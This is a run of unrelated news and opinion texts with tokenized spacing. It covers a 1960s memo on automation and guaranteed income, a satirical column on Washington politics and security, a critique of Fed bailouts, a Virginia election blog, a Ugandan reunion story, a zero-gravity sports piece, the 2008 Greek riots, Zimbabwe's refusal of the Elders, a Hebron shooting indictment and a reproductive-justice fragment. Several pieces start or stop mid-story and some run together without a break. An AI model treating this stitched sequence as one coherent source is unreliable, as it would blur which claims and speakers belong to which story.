4 . An efficiently functioning industrial system is assumed to provide the great majority of new jobs through the expansion of the private enterprise sector
But well over half of the new jobs created during 1957 - 1962 were in the public sector — predominantly in teaching .
Job creation in the private sector has now almost entirely ceased except in services ; of the four million three hundred thousand jobs created in this period , only about two hundred thousand were provided by private industry through its own efforts .
Many authorities anticipate that the application of cybernation to certain service industries , which is only just beginning , will be particularly effective .
If this is the case , no significant job creation will take place in the private sector in coming years .
5. Cybernation raises the level of the skills of the machine .
Secretary of Labor Willard Wirtz has recently stated that the machines being produced today have , on the average , skills equivalent to a high school diploma .
If a human being is to compete with such machines , therefore , he must at least possess a high school diploma .
The Department of Labor estimates , however , that on the basis of present trends , as many as thirty per cent of all students will be high school drop - outs in this decade .
6 . A permanently depressed class is developing in the US .
Some thirty - eight million Americans , almost one - fifth of the nation , still live in poverty .
The percentage of total income received by the poorest twenty per cent of the population was 4.9 % in 1944 and 4.7 % in 1963 .
Secretary Wirtz recently summarized these trends .
“ The confluence of surging population and driving technology is splitting the American labor force into tens of millions of ‘ have 's ’ and millions of ‘ have - nots . ’
In our economy of sixty - nine million jobs , those with wanted skills enjoy opportunity and earning power .
But the others face a new and stark problem — exclusion on a permanent basis , both as producers and consumers , from economic life .
This division of people threatens to create a human slag heap .
We cannot tolerate the development of a separate nation of the poor , the unskilled , the jobless , living within another nation of the well - off , the trained and the employed . "
Need for a New Consensus
The stubbornness and novelty of the situation that is conveyed by these statistics is now generally accepted .
Ironically , it continues to be assumed that it is possible to devise measures which will reduce unemployment to a minimum and thus preserve the over - all viability of the present productive system .
Some authorities have gone so far as to suggest that the pace of technological change should be slowed down “ so as to allow the industrial productive system time to adapt . ”
We believe , on the contrary , that the industrial productive system is no longer viable .
We assert that the only way to turn technological change to the benefit of the individual and the service of the general welfare is to accept the process and to utilize it rationally and humanely .
The new science of political economy will be built on the encouragement and planned expansion of cybernation .
The issues raised by cybernation are particularly amenable to intelligent policy - making : Cybernation itself provides the resources and tools that are needed to ensure minimum hardship during the transition process .
But major changes must be made in our attitudes and institutions in the foreseeable future .
Today Americans are being swept along by three simultaneous revolutions while assuming they have them under control .
In the absence of real understanding of any of these phenomena , especially of technology , we may be allowing an efficient and dehumanized community to emerge by default .
Gaining control of our future requires the conscious formation of the society we wish to have .
Cybernation at last forces us to answer the historic questions :
What is man 's role when he is not dependent upon his own activities for the material basis of his life ?
What should be the basis for distributing individual access to national resources ?
Are there other proper claims on goods and services besides a job ?
Because of cybernation , society no longer needs to impose repetitive and meaningless ( because unnecessary ) toil upon the individual .
Society can now set the citizen free to make his own choice of occupation and vocation our accepted modes of “ work . ”
But in the absence of such a new consensus about cybernation , the nation cannot begin to take advantage of all that it promises for human betterment .
Proposal for Action
As a first step to a new consensus it is essential to recognize that the traditional link between jobs and incomes is being broken .
The economy of abundance can sustain all citizens in comfort and economic security whether or not they engage in what is commonly reckoned as work .
Wealth produced by machines rather than by men is still wealth .
We urge , therefore , that society , through its appropriate legal and governmental institutions , undertake an unqualified commitment to provide every individual
This undertaking we consider to be essential to the emerging economic , social and political order in this country .
We regard it as the only policy by which the quarter of the nation now dispossessed and soon - to - be dispossessed by lack of employment can be brought within the abundant society .
The unqualified right to an income would take the place of the patchwork of welfare measures — from unemployment insurance to relief — designed to ensure that no citizen or resident of the U.S. actually starves .
We do not pretend to visualize all of the consequences of this change in our values .
It is clear , however , that the distribution of abundance in a cybernated society must be based on criteria strikingly different from those of an economic system based on scarcity .
In retrospect , the establishment of the right to an income will prove to have been only the first step in the reconstruction of the value system of our society brought on by the triple revolution .
The present system encourages activities which can lead to private profit and neglects those activities which can enhance the wealth and the quality of life of our society .
Consequently , national policy has hitherto been aimed far more at the welfare of the productive process than at the welfare of people .
The era of cybernation can reverse this emphasis .
With public policy and research concentrated on people rather than processes we believe that many creative activities and interests commonly thought of as non-economic will absorb the time and the commitment of many of those no longer needed to produce goods and services .
Society as a whole must encourage new modes of constructive , rewarding and ennobling activity .
Principal among these are activities such as teaching and learning that relate people to people rather than people to things .
Education has never been primarily conducted for profit in our society ; it represents the first and most obvious activity inviting the expansion of the public sector to meet the needs of this period of transition .
We are not able to predict the long - run patterns of human activity and commitment in a nation when fewer and fewer people are involved in production of goods and services , nor are we able to forecast the overall patterns of income distribution that will replace those of the past full employment system .
However , these are not speculative and fanciful matters to be contemplated at leisure for a society that may come into existence in three or four generations .
The outlines of the future press sharply into the present .
The problems of joblessness , inadequate incomes , and frustrated lives confront us now ; the American Negro , in his rebellion , asserts the demands — and the rights — of all the disadvantaged .
The Negro’s is the most insistent voice today , but behind him stand the millions of impoverished who are beginning to understand that cybernation , properly understood and used , is the road out of want and toward a decent life .
The Transition *
[* This view of the transitional period is not shared by all the signers .
Robert Theobald and James Boggs hold that the two major principles of the transitional period will be ( 1 ) that machines rather than men will take up new conventional work openings and ( 2 ) that the activity of men will be directed to new forms of “ work ’ and “ leisure . ”
Therefore , in their opinion , the specific proposals outlined in this section are more suitable for meeting the problems of the scarcity - economic system than for advancing through the period of transition into the period of abundance . ]
We recognize that the drastic alternations in circumstances and in our way of life ushered in by cybernation and the economy of abundance will not be completed overnight .
Left to the ordinary forces of the market such change , however , will involve physical and psychological misery and perhaps political chaos .
Such misery is already clearly evident among the unemployed , among relief clients into the third generation and more and more among the young and the old for whom society appears to hold no promise of dignified or even stable lives .
We must develop programs for this transition designed to give hope to the dispossessed and those cast out by the economic system , and to provide a basis for the rallying of people to bring about those changes in political and social institutions which are essential to the age of technology .
The program here suggested is not intended to be inclusive but rather to indicate its necessary scope .
We propose :
1 . A massive program to build up our educational system , designed especially with the needs of the chronically under - educated in mind .
We estimate that tens of thousands of employment opportunities in such areas as teaching and research and development , particularly for younger people , may be thus created .
Federal programs looking to the training of an additional hundred thousand teachers annually are needed .
2. Massive public works .
The need is to develop and put into effect programs of public works to construct dams , reservoirs , ports , water and air pollution facilities , community recreation facilities .
We estimate that for each billion dollars per year spent on public works a hundred and fifty thousand to two hundred thousand jobs would be created .
Two billion dollars or more a year should be spent in this way , preferably as matching funds aimed at the relief of economically distressed or dislocated areas .
3 . A massive program of low - cost housing , to be built both publicly and privately , and aimed at a rate of seven hundred thousand to a million units a year .
4. Development and financing of rapid - transit systems , urban and interurban ; and other programs to cope with the spreading problems of the great metropolitan centers .
5 . A public power system built on the abundance of coal in distressed areas , designed for low - cost power to heavy industrial and residential sections .
6. Rehabilitation of obsolete military bases for community or educational use .
7 . A major revision of our tax structure aimed at redistributing income as well as apportioning the costs of the transition period equitably .
To this end an expansion of the use of excess profits tax would be important .
Subsidies and tax credit plans are required to ease the human suffering involved in the transition of many industries from man power to machine power .
8 . The trade unions can play an important and significant role in this period in a number of ways :
a . Use of collective bargaining to negotiate not only for people at work but also for those thrown out of work by technological change .
b. Bargaining for perquisites , such as housing , recreational facilities , and similar programs , as they have negotiated health and welfare programs .
c. Obtaining a voice in the investment of the unions ' huge pension and welfare funds , and insisting on investment policies which have as their major criteria the social use and function of the enterprise in which the investment is made .
d. Organization of the unemployed so that these voiceless people may once more be given a voice in their own economic destinies , and strengthening of the campaigns to organize white - collar and professional workers .
9 . The use of the licensing power of government to regulate the speed and direction of cybernation to minimize hardship ; and the use of minimum wage power as well as taxing powers to provide the incentives for moving as rapidly as possible toward the goals indicated by this paper .
These suggestions are in no way intended to be complete or definitively formulated .
They contemplate expenditures of several billions more each year than are now being spent for socially rewarding enterprises , and a larger role for the government in the economy than it has now or has been given except in times of crisis .
In our opinion , this is a time of crisis , the crisis of a triple revolution .
Public philosophy for the transition must rest on the conviction that our economic , social and political institutions exist for the use of man and that man does not exist to maintain a particular economic system .
This philosophy centers on an understanding that governments are instituted among men for the purpose of making possible life , liberty , and the pursuit of happiness and that government should be a creative and positive instrument toward these ends .
Change Must Be Managed
The historic discovery of the post - World War II years is that the economic destiny of the nation can be managed .
Since the debate over the Employment Act of 1946 , it has been increasingly understood that the federal government bears primary responsibility for the economic and social well - being of the country .
The essence of management is planning .
The democratic requirement is planning by public bodies for the general welfare .
Planning by private bodies such as corporations for their own welfare does not automatically result in additions to the general welfare , as the impact of cybernation on jobs has already made clear .
The hardships imposed by sudden changes in technology have been acknowledged by Congress in proposals for dealing with the long and short - run “ dislocations , ” in legislation for depressed and “ impacted ” areas , retraining of workers replaced by machines , and the like .
The measures so far proposed have not been “ transitional ” in conception .
Perhaps for this reason they have had little effect on the situations they were designed to alleviate .
But the primary weakness of this legislation is not ineffectiveness but incoherence .
In no way can these disconnected measures be seen as a plan for remedying deep ailments but only , so to speak , as the superficial treatment of surface wounds .
Planning agencies should constitute the network through which pass the stated needs of the people at every level of society , gradually building into a national inventory of human requirements , arrived at by democratic debate of elected representatives .
The primary tasks of the appropriate planning institutions should be :
* To collect the data necessary to appraise the effects , social and economic , of cybernation at different rates of innovation .
* To recommend ways , by public and private initiative , of encouraging and stimulating cybernation .
* To work toward optimal allocations of human and natural resources in meeting the requirements of society .
* To develop ways to smooth the transition from a society in which the norm is full employment within an economic system based on scarcity , to one in which the norm will be either non-employment , in the traditional sense of productive work , or employment on the great variety of socially valuable but “ non-productive ” tasks made possible by an economy of abundance ; to bring about the conditions in which men and women no longer needed to produce goods and services may find their way to a variety of self - fulfilling and socially useful occupations .
* To work out alternatives to defense and related spending that will commend themselves to citizens , entrepreneurs and workers as a more reasonable use of common resources .
* To integrate domestic and international planning .
The technological revolution has related virtually every major domestic problem to a world problem .
The vast inequities between the industrialized and the underdeveloped countries cannot long be sustained .
The aim throughout will be the conscious and rational direction of economic life by planning institutions under democratic control .
In this changed framework the new planning institutions will operate at every level of government — local , regional and federal — and will be organized to elicit democratic participation in all their proceedings .
These bodies will be the means for giving direction and content to the growing demand for improvement in all departments of public life .
The planning institutions will show the way to turn the growing protest against ugly cities , polluted air and water , an inadequate educational system , disappearing recreational and material resources , low levels of medical care , and the haphazard economic development into an integrated effort to raise the level of general welfare .
We are encouraged by the record of the planning institutions both of the Common Market and of several European nations and believe that this country can benefit from studying their weaknesses and strengths .
A principal result of planning will be to step up investment in the public sector .
Greater investment in this area is advocated because it is overdue , because the needs in this sector comprise a substantial part of the content of the general welfare , and because they can be readily afforded by an abundant society .
Given the knowledge that we are now in a period of transition it would be deceptive , in our opinion , to present such activities as likely to produce full employment .
The efficiencies of cybernation should be as much sought in the public as in the private sector , and a chief focus of planning would be one means of bringing this about .
A central assumption of planning institutions would be the central assumption of this statement , that the nation is moving into a society in which production of goods and services is not the only or perhaps the chief means of distributing income .
The Democratization of Change
The revolution in weaponry gives some dim promise that mankind may finally eliminate institutionalized force as the method of settling international conflict and find for it political and moral equivalents leading to a better world .
The Negro revolution signals the ultimate admission of this group to the American community on equal social , political and economic terms .
The cybernation revolution proffers an existence qualitatively richer in democratic as well as material values .
A social order in which men make the decisions that shape their lives becomes more possible now than ever before ; the unshackling of men from the bonds of unfulfilling labor frees them to become citizens , to make themselves and to make their own history .
But these enhanced promises by no means constitute a guarantee .
Illuminating and making more possible the “ democratic vistas ” is one thing ; reaching them is quite another , for a vision of democratic life is made real not by technological change but by men consciously moving toward that ideal and creating institutions that will realize and nourish the vision in living form .
Democracy , as we use the term , means a community of men and women who are able to understand , express and determine their lives as dignified human beings .
Democracy can only be rooted in a political and economic order in which wealth is distributed by and for people , and used for the widest social benefit .
With the emergence of the era of abundance we have the economic base for a true democracy of participation , in which men no longer need to feel themselves prisoners of social forces and decisions beyond their control or comprehension .

Oh god .
It ’s getting worse .
Everything .
I knew it would .
Death and taxes are long shots by comparison .
So I ’m in Washington , a federal enclave , as someone said , surrounded on all four sides by reality .
This was supposed to be a medical trip to have vital internal organs pawed , sliced , and injected with strange fluids .
Kidneys , carburetor , remaining brain , that sort of thing .
But this is Washington .
Horrors everywhere .
Hillary .
I do n’t hate Hillary .
She ’s smart , tough , sane , been around , corrupt , and personally repellent as a fanged garden slug .
By today ’s standards , that ’s a bargain .
But why the hell is she Secretary of State ?
How many years has she spent abroad ?
What languages does she speak ?
What does she know about the street in Karachi , Cairo , Guadalajara ?
She probably thinks Mumbai is what you eat with a RC Cola .
See , what ’s happened is that we are ruled by an incestuous bridge club clucking to itself in what amounts to a thermos bottle .
Hillary is SecState because Precedent O’Bama wants to heal rifts within the Democratic Party .
It would make more sense to poison the lot , but never mind .
Everything is about domestic politics .
And these dismal retreads promote each other in circles .
Hillary goes from governor ’s wife to First Basilisk to senator to SecState .
Oh help .
Same with Cuba .
The good of the country does n’t matter .
We gotta keep the rubes gurgling with delight .
That ’s all that counts .
The US continues to make itself loathed in Latin America , in substantial part because of that stupid embargo .
Why ?
Because a noisy rabble of pseudo - Cuban losers in Miami votes Republican .
But of course it does n’t matter what the rest of the world thinks .
All those funny little countries around the world really do n’t have anything we need , except our economy , and China will give us visas to visit our industry .
Perhaps .
And then there ’s this business of having a black president .
It seemed like a good idea .
We ’ve had white ones forever and it has n’t worked , so a black one made sense .
We have now established that a black president is exactly like a white one .
Next time , maybe a Melanesian or Lao .
I hoped O’Bama would stand in the Rose Garden and holler ,  You blue - eyed muhfuhs done got it all wrong , and I ’m gonna unscrew things . 
No .
Smart guy , decent guy , guy you could heist a brew with and tell dirty stories , but it ’s business as usual .
Same tired hacks .
I think I know why .
Inexperience .
Ponder his relation to the Five - Sided Wind Tunnel on the Potomac .
I spent thirty years covering the military and I know all the Pentagon ’s songs .
O’Bama does n’t .
He missed Vietnam , was n’t in the military , has n’t had much to do with generals or soldiers .
It ’s not his fault and it is n’t a character defect , but there it is .
So in walks Power Point Petraeus , back from bombing weddings in Afghanistan .
Power Point is impressive .
I ’ve never met him , but I ’ve met plenty of identical units .
Erect posture , firm handshake , carefully deferential enough but you can just tell he ’s strong and reliable .
And he can sling the lingo (  Ohhhh , I love it when you talk that way . ) with the stern honesty of an overgrown Boy Scout and the guile of a serpent , and he ’s patriotic to the gills and he ’s got charts .
And O’Bama does n’t know better .
So Afghan brides will continue to need Kevlar dresses .
Meanwhile , things get loonier on the street .
I went to Johns Hopkins in Baltimore from DC by train and , so help me , they ’re doing the same garish security theater on trains that they do at hairports .
Cops and German Shepherds everywhere .
To buy a freaking commuter - rail ticket , you need a photo ID , and they type heaven knows what into a computer .
Okay , suppose I show up at the Obedience Training window with my suitcase full of Semtex , buy my ticket with my own ID or any ID with a balding ugly mutt on it they barely look at it and blow the 9:07 MARC to metallic sawdust .
After the fact they assemble my shards , check the computer , and determine that It Must Have Been Fred .
This miraculously brings the dead back to life .
Bet you did n’t know I had such powers .
None of it makes sense , except as Pavlovian conditioning .
Every few minutes a tedious recording plays in stations saying to call some number if you see suspicious behavior .
Blah blah blah .
No one pays the least attention .
No one writes the number down .
Has anyone ever called it ?
 Uh , I want to report suspicious behavior . 
Voice , annoyed at having the Redskins game interrupted :  Yeah , what ? 
 Well , there ’s like , this guy , he has a funny looking raincoat and he keeps , you know , looking around , and I think his left hand is twitching . 
 Uh yeah .
Tell him to stop twitching .
 What if he , you know , blows up or something ? 
 What am I , your mother ? 
I do n’t get it .
Something is happening to this country .
It still has a lot going for it friendly people , great diners , good blues , country bands , widespread availability of illegal drugs .
But the government is out of control .
Everything is illegal and watched .
It ’s getting so you ca n’t shoot cats from a car window with a twelve - gauge any more .
Who wants to live in that kind of world ?
We ’ll probably be overrun by cats , drown in them .
Today I went to the Hill to see the new Visitors Center .
As usual , cops everywhere , squad cars parked on sidewalks , steel stop ’em - cars plates rising from streets .
People do n’t seem frightened , but the government is , or pretends to be .
The Visitors Center turns out to be underground at the Capitol .
It is said to have cost $ 761 temporarily deflated green ones and has the mental fingerprints of Albert Speer all over it :
It ’s huge , drab , squarish , monumental without even being imposing , with the élan of a K - Street office building .
I do n’t get it .
This is the country that produced Peggy Lee and Tampa Red and the ‘ fitty - sedden Chevy , the country that spits techno - whizz golf carts onto Mars just like it was even possible , that brought the hamburger to gorgeous bejuiced perfection and invented most of the modern world .
It ’s the home of sand - lot baseball and Little Peggy March and BB guns and Tasty Freeze .
It is , in a phrase , one fine place .
How did it sink to being a proto - Soviet surveillance state that builds vast awful Visitor Centers in the style of a Hitlerian mauseoleum ?
You ca n’t go to the john without a photo ID anymore .
Something ai n’t right .

In response to the meltdown of financial institutions , unprecedented power has been unleashed by the federal government .
Between actions by the Federal Reserve , the TARP , guarantees made by the FDIC , and other direct bailouts , the total comes to nearly $ 8 trillion .
That 's over 30 times the inflation - adjusted cost of the S&L bailout , according to Bianco Research .
But the mainstream financial press is urging the Fed to do much , much more .
" Look , this is no time for the Fed to act like a bashful virgin , " ex - Fed operative Vincent Reinhart told Barron's .
Reinhart used to be the director of monetary affairs under Greenspan and now toils for the American Enterprise Institute .
Ironically , Mr. Reinhart says that because we are now in a " dangerous period , " the central bank " needs to be aggressively buying all sorts of paper , including toxic assets like collateralized debt obligations , non-agency mortgage - backeds and non-investment - grade corporate bonds in order to bring liquidity to the markets and raise security prices . "
That would be the paper much of which was created during the monetary expansion ramped up by Reinhart and his former boss .
Of course Fed chair Ben Bernanke is doing all he can to disabuse any and all that he is a bashful virgin .
" Although conventional interest rate policy is constrained by the fact that nominal interest rates cannot fall below zero , the second arrow in the Federal Reserve 's quiver — the provision of liquidity — remains effective , " he told the Greater Austin ( Texas ) Chamber of Commerce .
Bernanke told the Chamber audience that the Fed could buy long - term Treasuries and other agency securities on the open market to raise prices and lower yields .
Indeed , Bernanke 's employer purchased $ 5 billion worth of debt from Fannie , Freddie , and the Federal Home Loan Banks just a few days after he spoke .
All of this monetary pumping has n't put anyone to work .
The labor department reports that 533,000 jobs were lost last month .
And if part - time workers wanting full - time work and anyone who has looked for work in the last year unsuccessfully are added to those who are included in the official unemployment rate , the total amounts to a 12.5 percent unemployment rate , according to the New York Times , " the highest level since the government began calculating the measure in 1994 . "
But the argument is that we must be patient with our wise men at the Fed and the Treasury .
Monetary policy takes time to work , but , rest assured , the mistakes of the 1930s will not be made again .
After all , Ben Bernanke is an expert on the Great Depression , we 're told over and over .
He knows what to do to make sure it does n't happen again .
But as F.A. Hayek explained in his 1974 Nobel Prize acceptance speech , entitled " The Pretense of Knowledge , " monetary and fiscal policies are the product of what he called the " scientistic " attitude , which is in fact unscientific in that it " involves a mechanical and uncritical application of habits of thought to fields different from those in which they have been formed . "
Just as it was 34 years ago , when Hayek delivered this seminal speech , which is included in the soon - to - be published book A Free - Market Monetary System , there is the belief that there " exists a simple positive correlation between total employment and the size of the aggregate demand for goods and services ; it leads to the belief that we can permanently assure full employment by maintaining total money expenditure at an appropriate level . "
So while Bernanke , Treasury Secretary Hank Paulson , and soon - to - be Treasury Secretary Tim Geithner think they can crunch the data , make a diagnosis , concoct the right monetary witch 's brew , and inject lots of it to make us all employed and living happily ever after , the fact is that 's impossible .
In the physical sciences , that may work ; but , as Hayek explains , " such complex phenomena as the market , which depends on the actions of many individuals , all the circumstances which will determine the outcome of a process … will hardly ever be fully known or measurable . "
The wise ones at the Fed and Treasury are only looking at factors that can be quantitatively measured and disregard any factors that can't .
Thus , " they thereupon happily proceed on the fiction that the factors which they can measure are the only ones that are relevant . "
No single observer could know all the factors determining prices and wages in a well - functioning marketplace .
But because policy makers think they know , " an almost exclusive concentration on quantitative measurable surface phenomena has produced a policy which has made matters worse , " said Hayek back in 1974 .
Nothing has changed .
Bernanke and company are making matters worse by endlessly inflating and bailing out dysfunctional firms .
The result will be more unemployment , not less .
But not - so - bashful Ben is arrogant enough to believe that he can step on the monetary gas , make things all better , and then return the Fed balance sheet to normal ( whatever that is ) .
Perhaps Chamber members believed him when he said , " To avoid inflation in the long run and to allow short - term interest rates ultimately to return to normal levels , the Fed 's balance sheet will eventually have to be brought back to a more sustainable level .
The FOMC will ensure that that is done in a timely way . "
The government 's money men are engaging in what Hayek referred to as " the fatal conceit , " thinking they have the knowledge to fix and plan the economy .
They can and will only make matters worse .

Why voting matters :
Though I currently live in NYC , my family lives in Charlottesville , Virginia , where Republican incumbent Virgil Goode has been the congressional Representative for what feels like forever .
Virgil Goode has quite the history on him , mostly race - baiting and saying pretty awful things about gays and Muslims , so some of us were really hoping he would be getting the boot in 2008 with the popularity of Barack Obama and Mark Warner ( former Governor and soon to be Senator of Virginia ) .
My Dad usually votes Republican / Third Party , my mom votes straight Democrat , and I begrudgingly vote Independent / Democrat in most elections .
Well , things changed this year …
I guess we all got fed up with Bush and the past 8 years , enough so to drive a centrist - right person like my Dad into a straight Democratic ticket .
Good timing too , because this was the year to clean house .
And while no polls showed Goode ’s challenger , Democrat Tom S. P. Perriello , coming within 5 % , we all were hoping for some sort of election miracle .
And it looks like we may have gotten it :
As of 3:31 the day after the election with 100 % precincts reporting , Perriello is ahead by 31 votes .
Yes , with over 315,000 votes cast , Tom Perriello is ahead by 31 votes .
I ’m really glad I voted .
And I ’m even gladder that my whole family voted .
Mom , Dad , and I constitute 10 % of Perriello ’s lead .
And I hope it stays that way .

Sara , now in her 30s , was kidnapped at the age of five ( Photo : New Vision ) A Ugandan mother and daughter have told the BBC about their joy at being reunited this week after 26 years .
Five - year - old Florence Kampi was kidnapped at her father 's funeral by a family who used her as a slave .
She was taken to Yemen where she was eventually rescued by a Tanzanian oil worker who , after he paid the family money , was allowed to marry her .
" I feel so happy , " she said about the reunion .
Her mother said , " I burst out crying ... but they were tears of joy . "
Language is now a barrier for the pair as Florence , now called Sara Aisha Abdulhakim , speaks Swahili and Arabic .
I do n't know what God has in store for us , what matters is we are together
Sesiriya Biryeri
Her mother , Sesiriya Biryeri , speaks Lusoga , the local language in the eastern Ugandan district of Iganga .
" We have a few people here helping with translations from Swahili to Lusoga and vice versa ; it is a nice confusion , " Ms Abdulhakim , who arrived in Uganda on Wednesday with her four sons , told the BBC's Focus on Africa programme .
Her return was organised by the International Organization for Migration ( IOM ) - who she contacted at her husband 's suggestion .
 Language is a big problem for her , " Alia Hirji , Uganda 's IOM programme officer , told the Ugandan New Vision newspaper .
" We shall help her re-integrate socially and economically , " he said .
Ms Abdulhakim says her happiness will be complete when her husband can join her .
He returned to Tanzania earlier in the year to look after his ill father , who died last month .
Meanwhile , Ms Biryeri says she will do her best to learn Swahili .
" I do n't know what God has in store for us , what matters is we are together , " she said .

GREENBELT , Md. —
The game would be called Float Ball .
It would combine elements of basketball , football and the Lionel Richie video for “ Dancing on the Ceiling ” into a sort of free - for - all , compelling weightless players to bounce off walls , obstacles and one another while herding weightless balls of various colors to either end of the playing space , which would be placed inside the cabin of a zero - gravity plane or , possibly , on the moon .
Eventually , one day , if all went well , some sort of custom arena would be constructed .
On Mars .
“ There ’s a bonus , ” said the game ’s promoter , Ken Harvey , speaking to an attentive audience of National Aeronautics and Space Administration engineers , technicians and scientists at the Goddard Space Flight Center here recently , “ where you have to pick up a person holding a certain ball and throw them through a hoop as a sort of extra point . ”
The football analogy seemed to come easily to mind .
Ken Harvey was that Ken Harvey , No. 57 in your Washington Redskins program for much of the late 1990s .
Playing linebacker during the largely highlight - free interregnum of Coach Joe Gibbs , Harvey made four appearances in the Pro Bowl .
Now 43 , he has not played a down since he dropped out of training camp in 1999 .
This year , he took a day job in the front office , where he has been charged with serving , according to Redskins management , “ as a resource and adviser in the development of responsibility initiatives . ”

Hundreds of students clashed with police in several Greek cities today during a third day of rioting , increasing the pressure on an already unpopular government .
Police fired tear gas at rioters in Thessaloniki , Greece 's second largest city .
Clashes were also reported in Crete , Corfu , and several other places , while in Athens , 13 police stations were damaged .
With a 24 - hour general strike due on Wednesday against pension reforms and the government 's economic policies , Greeks fear that general unrest could last for days .
More trouble was expected later tonight as the Greek Communist party called a rally , despite the arrest of two police officers for the shooting on Saturday night of a 15 - year - old boy .
" We will not tolerate unacceptable and dangerous events prompted by the tragic incident , " the prime minister , Costas Karamanlis , said in a televised statement .
Even before the violence at the weekend , the ruling Conservative party was already feeling the heat .
Unpopular economic policies and allegations of corruption have seen the government sink in the polls .
Britain and Australia have urged tourists to take care when visiting Athens .
Rioters remain barricaded at two university campuses there , and youths have blocked two main roads in the capital and an urban rail system .
Demonstrations also turned violent in Trikala , a small central Greek town where a policeman was reportedly injured and a rail route blocked .
Police fought running battles with demonstrators at the weekend , after the shooting of a teenager by police .
Authorities have charged a 37 - year - old policeman with murder for the killing of Alexandros Grigoropoulos , in Athens ' central Exarchia district , an area known for lawlessness and drugs .
Grigoropoulos was shot in the left side of the chest and died before an ambulance transported him to a state hospital , health ministry officials said .
The police officers ' association has apologised to the boy 's family and the country 's president , Karolos Papoulias , sent a telegram to his parents expressing his condolences .
" This death was a blow to the country , " Papoulias said .
" I am certain that those responsible will be held to account . "
Police said 14 people were arrested in Athens over the weekend for public disturbances and looting .
Health officials said hospitals treated 29 people with minor injuries from yesterday 's violence .
" Under the circumstances I think we achieved the best possible result , " said Panayiotis Stathis , a police spokesman .
" Human life was protected , both that of the demonstrators and the police .
That 's the most important thing . "
The violence – the worst Greece has seen in years - erupted late on Saturday and spread within hours to Thessaloniki , Greece 's northern capital , its western port city of Patras and Chania on Crete .
Helmeted and hooded demonstrators went on the rampage , venting anger and disaffection exacerbated by the economic crisis .
By last night , several areas including Athens 's main commercial strip and the streets around its fabled polytechnic resembled a battle zone , with glass , rubble and broken mannequins on the footpaths .
Smoke filled the capital 's skyline and shopkeepers rushed to clear up debris .
Officials said more than 30 people were injured including police , firefighters and bystanders .
Looting was rife .
Television stations showed stone - throwing youths erecting barricades in Athens .
Police responded by firing teargas .
The rioters sought sanctuary in the grounds of the Polytechnic and Athens University , which traditionally have been off - limits to security forces since the collapse of military rule in 1974 .
The crisis deepened yesterday in both Athens and Thessaloniki as thousands of demonstrators marched through the streets shouting anti-government slogans .
" Down with the murderers in uniform , " they shouted at the police .
" I 've never seen anything like this , " said Kostas Koskliouris , 42 , standing outside the Benetton clothing store where he works .
" So much of Athens is destroyed and it all happened in just a couple of hours . "
The scale of the protests appeared to catch Greece 's embattled centre - right government off guard .
Angered and embarrassed by the killing of the teenager – the schoolboy son of a bank manager – the interior minister , Prokopis Pavlopoulos , immediately tendered his resignation , promising " exemplary punishment " for the police involved .
A police statement said an officer fired three shots after his car was attacked by 30 youths in Exarchia .
A police official said the officer described his gunfire as warning shots but witnesses told Greek television he aimed at the boy .
The prime minister has publicly apologised to the father of the dead boy .
" I know nothing can relieve your pain , but I assure you ... the state will act , as it ought to , so that yesterday 's tragedy wo n't be repeated . "
There is little sign that pleas for calm are being heeded .
" Greek society has been besieged by a feeling of hopelessness ; many do n't believe in anything , " said Stelios Bahis , 44 , a former merchant marine engineer who works as a museum guard .
" It was great that the politicians we have today helped get rid of the junta in 1974 .
But ever since they 've just created their own cliques of power and sidelined those who are not with them .
People have had enough of the scandals , the corruption and especially the police , who we all know are not clean . "

Ms. Machel said both South Africa ’s president , Kgalema Motlanthe , and his recently ousted predecessor , Thabo Mbeki , who is mediating the Zimbabwe crisis , had sought permission from Zimbabwean authorities for them to enter the country .
Mr. Carter said Mr. Mugabe himself said no .
“ It seems obvious to me that leaders of the government are immune to reaching out for help for their own people , ” Mr. Carter said at a news conference in Johannesburg .
Mr. Carter said Zimbabwe ’s envoy in Washington had advised him that he would not be issued a visa after he applied for one several weeks ago , but Mr. Carter said the staff of the group sponsoring the trip , the Elders , thought visas would be issued at the airport .
South African officials advised the humanitarian mission ’s members on Friday evening that they would not be allowed to enter the country .
Zimbabwe ’s foreign minister , Simbarashe Mumbengegwi , was quoted in the state - owned newspaper , The Sunday Mail , saying authorities had not barred the threesome , but had only postponed the visit because Mr. Annan had not consulted with the government on the timing and program for the visit .
He said it would have been difficult for the team to meaningfully assess the situation on the ground given that Zimbabwe ’s government itself had already conducted a humanitarian audit with United Nations officials .
“ It is most unfortunate that the former secretary general has , for reasons best known to himself , misrepresented the position of the government of Zimbabwe , ” Mr. Mumbengegwi said .
“ The allegations are not supported by facts . ”
The State Prosecutor 's Office has filed an indictment against Ze'ev Brauda , a settler from Kiryat Arba suspected of firing at Palestinians after the eviction of the disputed house in the West Bank city of Hebron last week .
The State decided to charge Brauda with assault with malicious intent .
Earlier Wednesday , the Jerusalem Magistrate 's Court remanded Brauda to house arrest , but the prosecution appealed the decision , demanding he be remanded to police custody pending the conclusion of the legal proceedings against him .
Reprimand PM : Hebron violence a pogrom Roni Sofer ( Video ) Olmert opens cabinet meeting with attack on settlers ' actions in West Bank city following evacuation of disputed house : ' As a Jew , I 'm ashamed of the sights of Jews firing at Arabs in Hebron . '
Cabinet approves NIS 695 milion increase to southern communities ' fortification budget PM : Hebron violence a pogrom
According to the indictment , during the tumultuous events surrounding the eviction of the Hebron house , Brauda pulled out his gun and demanded several Palestinians living adjacently to the disputed house go back inside their house .
Brauda , who was reportedly accompanied by an unidentified young man , went into the house as well .
When the family patriarch demanded he leave , Brauda proceeded to hit him and then aimed his gun at him .
Other family members tried to remove Brauda from their home , at which point he fired at them .
One of the shots hit the family patriarch in the chest .
Another family member was able to knock Brauda to the ground , at which point he fired two more shots – one hitting a third family member in the arm .
Other members of the Palestinian family lunged at Brauda , who was eventually extracted from the premises by other Kiryat Arba settlers .
Justice Malka Aviv , who presided over the bail hearing , criticized the police actions in the case : " The police are radically making light of the behavior demonstrated by the Palestinians involved in the incident , she said , noting that no Palestinians were arrested in the case , despite the severity of the events and the obvious near - lynching of Brauda .
Attorney Ariel Atari , for Brauda , claimed that his client fired only to keep his son away from the disputed house in Hebron , and then found himself surrounded by Palestinians carrying rocks , leading him to fear for his life .
Once the court decided to remand Brauda to house arrest , the State told the court it would be appealing the decision , as asked his release to be postponed , pending a hearing in a higher instance .
African American women who care about reproductive justice are not fooled into thinking that the Black anti-abortion movement cares about gender justice .
If they had their way , we would be re-enslaved once again , based on our fertility .
I have spoken on many campuses in the wake of the “ Genocide Awareness
Project , ” which displays posters at colleges to create controversy
among young people about Black abortion .
Students are understandably
confused when presented with seemingly fact - based information that
claims that Black women are the scourge of the African American
community .
